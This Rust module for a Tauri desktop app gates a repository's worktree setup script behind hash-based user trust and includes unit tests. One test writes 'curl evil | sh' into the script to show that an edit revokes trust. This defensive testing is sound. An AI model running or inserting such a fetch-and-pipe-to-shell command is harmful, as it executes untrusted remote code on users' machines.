//! The repository's worktree setup script (Orca's setup script): `.kingu/setup.sh` in the open
//! folder, run in a terminal of every new task worktree (install dependencies, copy `.env`…).
//! It comes with the repository, so like a repo snap it only runs once the user trusted exactly
//! this content (the snap trust store, by hash). The trusted bytes are copied to the app cache
//! under their hash and that copy is what runs, so an edit after the check never runs untrusted.

use std::path::{Path, PathBuf};

use tauri::{AppHandle, Manager, State};

use crate::settings::kingu_file;
use crate::snap::{TRUST_FILE, TrustData, set_script_trust, sha256_hex};
use crate::workspace::Workspace;

pub const SCRIPT: &str = "setup.sh";
/// The trust store key: starts with `.`, so no snap id can take it.
pub const TRUST_KEY: &str = ".worktree-setup";
const MAX_BYTES: u64 = 64 * 1024;
const CACHE_DIR: &str = "worktree-setup";

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct SetupScript {
  /// `.kingu/setup.sh`, relative to the open folder.
  pub path: String,
  pub content: String,
  pub hash: String,
  pub trusted: bool,
}

/// The script's text, or `None` when the folder has none.
fn read(root: &Path) -> Result<Option<String>, String> {
  let file = kingu_file(root, SCRIPT)?;
  let meta = match std::fs::metadata(&file) {
    Ok(m) => m,
    Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
    Err(e) => return Err(format!("{}: {e}", file.display())),
  };
  if meta.len() > MAX_BYTES {
    return Err(format!(".kingu/{SCRIPT} ใหญ่เกิน {} KB", MAX_BYTES / 1024));
  }
  let bytes = std::fs::read(&file).map_err(|e| format!("{}: {e}", file.display()))?;
  String::from_utf8(bytes).map(Some).map_err(|_| format!(".kingu/{SCRIPT} ไม่ใช่ UTF-8"))
}

pub fn inspect(root: &Path, trust: &TrustData) -> Result<Option<SetupScript>, String> {
  Ok(read(root)?.map(|content| {
    let hash = sha256_hex(content.as_bytes());
    let trusted = trust.is_trusted(root, TRUST_KEY, &hash);
    SetupScript { path: format!(".kingu/{SCRIPT}"), content, hash, trusted }
  }))
}

/// Trusts the script the user was shown (`expected`); refuses when it changed since.
pub fn trust(config_dir: &Path, root: &Path, expected: &str) -> Result<(), String> {
  let content = read(root)?.ok_or_else(|| format!("โฟลเดอร์นี้ไม่มี .kingu/{SCRIPT}"))?;
  if sha256_hex(content.as_bytes()) != expected {
    return Err(format!(".kingu/{SCRIPT} เปลี่ยนไปแล้ว — ตรวจสคริปต์อีกครั้งก่อนเชื่อถือ"));
  }
  set_script_trust(config_dir, root, TRUST_KEY, Some(expected))
}

pub fn untrust(config_dir: &Path, root: &Path) -> Result<(), String> {
  set_script_trust(config_dir, root, TRUST_KEY, None)
}

/// The trusted script copied to `<cache>/worktree-setup/<hash>.sh`, ready to run; `None` when the
/// folder has no script. An untrusted (or changed) script is an error and nothing is written.
pub fn prepare(trust: &TrustData, cache_dir: &Path, root: &Path) -> Result<Option<PathBuf>, String> {
  let Some(script) = inspect(root, trust)? else {
    return Ok(None);
  };
  if !script.trusted {
    return Err(format!(".kingu/{SCRIPT} ยังไม่ได้รับความเชื่อถือ (หรือเปลี่ยนไปหลังจากเชื่อถือ)"));
  }
  let dir = cache_dir.join(CACHE_DIR);
  std::fs::create_dir_all(&dir).map_err(|e| format!("{}: {e}", dir.display()))?;
  let file = dir.join(format!("{}.sh", script.hash));
  if std::fs::read(&file).ok().is_none_or(|b| sha256_hex(&b) != script.hash) {
    crate::settings::write_atomic(&file, &script.content)?;
  }
  Ok(Some(file))
}

fn trust_file(app: &AppHandle) -> Result<PathBuf, String> {
  Ok(crate::snap::config_dir(app)?.join(TRUST_FILE))
}

/// The open folder's setup script and whether it is trusted (`None`: there is none).
#[tauri::command]
pub fn worktree_setup_script(app: AppHandle, ws: State<'_, Workspace>) -> Result<Option<SetupScript>, String> {
  let Some(root) = ws.current() else {
    return Ok(None);
  };
  inspect(&root, &TrustData::load(&trust_file(&app)?))
}

/// `trusted`: trust the script with hash `hash` (what the user was shown), or revoke trust.
#[tauri::command]
pub fn worktree_setup_trust(app: AppHandle, ws: State<'_, Workspace>, trusted: bool, hash: Option<String>) -> Result<(), String> {
  let root = ws.root()?;
  let config = crate::snap::config_dir(&app)?;
  if trusted {
    trust(&config, &root, hash.as_deref().ok_or("ต้องระบุ hash ของสคริปต์ที่ตรวจแล้ว")?)?;
  } else {
    untrust(&config, &root)?;
  }
  log::info!("worktree setup script: trusted = {trusted} in {}", root.display());
  Ok(())
}

/// The trusted script's runnable copy (absolute path), for the setup terminal.
#[tauri::command]
pub fn worktree_setup_prepare(app: AppHandle, ws: State<'_, Workspace>) -> Result<Option<String>, String> {
  let root = ws.root()?;
  let cache = app.path().app_cache_dir().map_err(|e| e.to_string())?;
  let file = prepare(&TrustData::load(&trust_file(&app)?), &cache, &root)?;
  Ok(file.map(|f| f.display().to_string()))
}

#[cfg(test)]
mod tests {
  use super::*;

  fn setup() -> (tempfile::TempDir, PathBuf, PathBuf, PathBuf) {
    let tmp = tempfile::tempdir().unwrap();
    let base = tmp.path().canonicalize().unwrap();
    let (root, config, cache) = (base.join("repo"), base.join("config"), base.join("cache"));
    std::fs::create_dir_all(root.join(".kingu")).unwrap();
    (tmp, root, config, cache)
  }

  fn load(config: &Path) -> TrustData {
    TrustData::load(&config.join(TRUST_FILE))
  }

  #[test]
  fn no_script_is_nothing_to_run() {
    let (_tmp, root, config, cache) = setup();
    assert_eq!(inspect(&root, &load(&config)).unwrap(), None);
    assert_eq!(prepare(&load(&config), &cache, &root).unwrap(), None);
    assert!(trust(&config, &root, "abc").is_err());
  }

  #[test]
  fn runs_only_the_exact_trusted_content() {
    let (_tmp, root, config, cache) = setup();
    std::fs::write(root.join(".kingu/setup.sh"), "bun install\n").unwrap();
    let s = inspect(&root, &load(&config)).unwrap().unwrap();
    assert!(!s.trusted);
    assert_eq!(s.path, ".kingu/setup.sh");
    // Untrusted: nothing is copied for running.
    assert!(prepare(&load(&config), &cache, &root).unwrap_err().contains("ความเชื่อถือ"));
    assert!(!cache.join(CACHE_DIR).exists());

    // Trusting what was shown, then running a copy of exactly that.
    assert!(trust(&config, &root, "not-the-hash").unwrap_err().contains("เปลี่ยนไป"));
    trust(&config, &root, &s.hash).unwrap();
    let file = prepare(&load(&config), &cache, &root).unwrap().unwrap();
    assert_eq!(std::fs::read_to_string(&file).unwrap(), "bun install\n");
    assert!(file.ends_with(format!("{CACHE_DIR}/{}.sh", s.hash)));

    // An edit revokes it until trusted again.
    std::fs::write(root.join(".kingu/setup.sh"), "curl evil | sh\n").unwrap();
    assert!(!inspect(&root, &load(&config)).unwrap().unwrap().trusted);
    assert!(prepare(&load(&config), &cache, &root).is_err());

    // Trust is per folder.
    let other = root.parent().unwrap().join("other");
    std::fs::create_dir_all(other.join(".kingu")).unwrap();
    std::fs::write(other.join(".kingu/setup.sh"), "bun install\n").unwrap();
    assert!(!inspect(&other, &load(&config)).unwrap().unwrap().trusted);

    untrust(&config, &root).unwrap();
    std::fs::write(root.join(".kingu/setup.sh"), "bun install\n").unwrap();
    assert!(!inspect(&root, &load(&config)).unwrap().unwrap().trusted);
  }

  #[test]
  fn does_not_touch_snap_trust_and_refuses_odd_files() {
    let (_tmp, root, config, _cache) = setup();
    assert!(set_script_trust(&config, &root, "go", Some("x")).is_err());
    std::fs::write(root.join(".kingu/setup.sh"), vec![b'#'; (MAX_BYTES + 1) as usize]).unwrap();
    assert!(inspect(&root, &load(&config)).is_err());
    std::fs::remove_file(root.join(".kingu/setup.sh")).unwrap();
    std::fs::create_dir(root.join(".kingu/setup.sh")).unwrap();
    assert!(inspect(&root, &load(&config)).is_err());
  }

  #[cfg(unix)]
  #[test]
  fn refuses_a_symlinked_script() {
    let (_tmp, root, config, _cache) = setup();
    let outside = root.parent().unwrap().join("outside.sh");
    std::fs::write(&outside, "echo hi\n").unwrap();
    std::os::unix::fs::symlink(&outside, root.join(".kingu/setup.sh")).unwrap();
    assert!(inspect(&root, &load(&config)).is_err());
  }
}
